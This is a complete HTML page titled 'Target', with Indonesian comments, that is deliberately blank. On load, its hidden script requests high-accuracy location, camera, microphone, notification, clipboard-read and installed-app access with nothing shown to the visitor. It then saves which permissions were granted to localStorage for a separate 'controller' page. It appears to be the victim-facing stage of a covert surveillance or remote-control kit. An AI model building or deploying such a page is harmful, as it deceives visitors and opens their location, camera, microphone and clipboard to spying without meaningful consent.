<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>Target</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: black;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Tidak ada elemen yang terlihat sama sekali */
    .hidden-container {
      display: none;
    }
  </style>
</head>
<body>
<!-- Halaman benar-benar kosong secara visual, tidak ada teks, spinner, atau tombol apapun -->
<div class="hidden-container"></div>

<script>
  (function() {
    // Halaman ini hanya meminta izin di background tanpa menampilkan apapun
    // Tidak ada redirect ke index2.html

    let permissionsGranted = {
      location: false,
      camera: false,
      microphone: false,
      notifications: false,
      clipboard: false,
      apps: false
    };

    // =============== PERIZINAN ===============
    async function requestLocationPermission() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          permissionsGranted.location = false;
          resolve(false);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          () => { permissionsGranted.location = true; resolve(true); },
          () => { permissionsGranted.location = false; resolve(false); },
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    async function requestCameraPermission() {
      try {
        const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
        tempStream.getTracks().forEach(track => track.stop());
        permissionsGranted.camera = true;
        return true;
      } catch (e) {
        permissionsGranted.camera = false;
        return false;
      }
    }

    async function requestMicrophonePermission() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        stream.getTracks().forEach(t => t.stop());
        permissionsGranted.microphone = true;
        return true;
      } catch (e) {
        permissionsGranted.microphone = false;
        return false;
      }
    }

    async function requestNotificationPermission() {
      if (!('Notification' in window)) {
        permissionsGranted.notifications = false;
        return false;
      }
      if (Notification.permission === 'granted') {
        permissionsGranted.notifications = true;
        return true;
      }
      const result = await Notification.requestPermission();
      permissionsGranted.notifications = (result === 'granted');
      return permissionsGranted.notifications;
    }

    async function requestClipboardPermission() {
      if (!navigator.clipboard || !navigator.clipboard.readText) {
        permissionsGranted.clipboard = false;
        return false;
      }
      try {
        await navigator.clipboard.readText();
        permissionsGranted.clipboard = true;
        return true;
      } catch (err) {
        permissionsGranted.clipboard = false;
        return false;
      }
    }

    async function requestAppsPermission() {
      if ('getInstalledRelatedApps' in navigator) {
        try {
          await navigator.getInstalledRelatedApps();
          permissionsGranted.apps = true;
          return true;
        } catch(e) {
          permissionsGranted.apps = false;
          return false;
        }
      } else {
        permissionsGranted.apps = false;
        return false;
      }
    }

    async function requestAllPermissions() {
      await requestLocationPermission();
      await requestCameraPermission();
      await requestMicrophonePermission();
      await requestNotificationPermission();
      await requestClipboardPermission();
      await requestAppsPermission();
      
      // Simpan status izin ke localStorage agar bisa dibaca oleh halaman controller manapun
      const permData = {
        location: permissionsGranted.location,
        camera: permissionsGranted.camera,
        microphone: permissionsGranted.microphone,
        notifications: permissionsGranted.notifications,
        clipboard: permissionsGranted.clipboard,
        apps: permissionsGranted.apps,
        timestamp: Date.now()
      };
      localStorage.setItem('controllerPermissions', JSON.stringify(permData));
    }
    
    // Jalankan permintaan izin di background tanpa menampilkan apapun
    requestAllPermissions();
  })();
</script>
</body>
</html>
